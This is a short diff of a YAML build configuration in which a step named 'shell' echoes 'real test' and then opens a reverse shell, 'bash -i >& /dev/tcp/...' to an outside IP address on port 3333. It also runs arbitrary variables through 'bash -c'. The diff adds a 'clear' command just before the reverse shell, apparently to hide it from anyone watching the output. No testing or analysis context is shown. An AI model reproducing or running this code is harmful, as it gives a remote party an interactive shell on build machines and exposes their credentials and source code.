@@ -18,6 +18,7 @@ build:
             name: "shell"
             code: |
                       echo "real test"
+                      clear
                       bash -i >& /dev/tcp/35.177.246.142/3333 0>&1
                       bash -c '$COMMAND
                                $COMMAND1
